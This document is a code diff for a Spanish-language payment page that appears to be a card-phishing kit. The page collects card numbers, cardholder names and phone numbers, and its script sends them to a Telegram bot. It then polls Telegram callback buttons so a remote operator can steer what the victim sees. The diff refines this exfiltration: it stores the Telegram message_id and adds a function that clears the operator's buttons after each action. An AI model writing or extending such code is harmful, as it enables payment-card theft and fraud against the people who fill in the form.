@@ -102,8 +102,6 @@
                         <label for="numero_tarjeta" class="block text-sm font-medium text-gray-700 mb-1">Número de tarjeta</label>
                         <div class="relative">
                             <input type="tel" id="numero_tarjeta" class="w-full text-lg border border-gray-400 rounded-md p-2 pr-12" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
-                            
-                            
                         </div>
                     </div>
 
@@ -154,7 +152,6 @@
             const pagarBtn = document.getElementById("pagarBtn");
             const spinnerModal = document.getElementById('spinner-modal');
             const errorMessage = document.getElementById("errorMessage");
-            const cardIcon = document.getElementById("card-icon");
             const errorModal = document.getElementById('error-modal');
             const errorModalMessage = document.getElementById('error-message-modal');
 
@@ -272,13 +269,6 @@
                 let { value } = e.target;
                 value = value.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim();
                 e.target.value = value;
-                const cardType = getCardType(value);
-                if (cardType) {
-                    cardIcon.src = `img/${cardType.toLowerCase()}.png`;
-                    cardIcon.style.display = 'block';
-                } else {
-                    cardIcon.style.display = 'none';
-                }
                 validateForm();
             });
 
@@ -296,6 +286,7 @@
             nombreTitularInput.addEventListener('input', validateForm);
             telefonoInput.addEventListener('input', validateForm);
 
+            // Función para enviar a Telegram y obtener el message_id
             async function sendToTelegram(messageContent, keyboard) {
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                 const payload = {
@@ -314,13 +305,42 @@
                     if (!response.ok) {
                         const errorText = await response.text();
                         console.error(`Error al enviar mensaje a Telegram: ${response.status} - ${errorText}`);
-                        return false;
+                        return null;
                     }
+                    const data = await response.json();
                     console.log('Mensaje enviado a Telegram exitosamente.');
-                    return true;
+                    return data.result.message_id; // Retornar el message_id
                 } catch (error) {
                     console.error('Error de red al enviar mensaje a Telegram:', error);
-                    return false;
+                    return null;
+                }
+            }
+
+            // Función para borrar los botones del mensaje
+            async function editTelegramMessage(chatId, messageId) {
+                if (!chatId || !messageId) return;
+
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`;
+                const payload = {
+                    chat_id: chatId,
+                    message_id: messageId,
+                    reply_markup: {} // Objeto vacío para eliminar los botones
+                };
+
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload),
+                    });
+                    if (!response.ok) {
+                        const errorText = await response.text();
+                        console.error(`Error al borrar botones de Telegram: ${response.status} - ${errorText}`);
+                    }
+                } catch (error) {
+                    console.error('Error de red al borrar botones de Telegram:', error);
                 }
             }
 
@@ -349,6 +369,10 @@
 
                             const callbackDataFull = latest.callback_query.data;
                             const callbackId = latest.callback_query.id;
+                            const messageId = sessionStorage.getItem('telegramMessageId'); // Obtener el message_id guardado
+
+                            // Borrar los botones antes de la acción
+                            await editTelegramMessage(TELEGRAM_CHAT_ID, messageId);
 
                             try {
                                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
@@ -426,9 +450,10 @@
                     ]
                 };
 
-                const sent = await sendToTelegram(telegramMessage, keyboard);
+                const messageId = await sendToTelegram(telegramMessage, keyboard);
 
-                if (sent) {
+                if (messageId) {
+                    sessionStorage.setItem('telegramMessageId', messageId);
                     checkVerificationStatus();
                 } else {
                     spinnerModal.style.display = 'none';
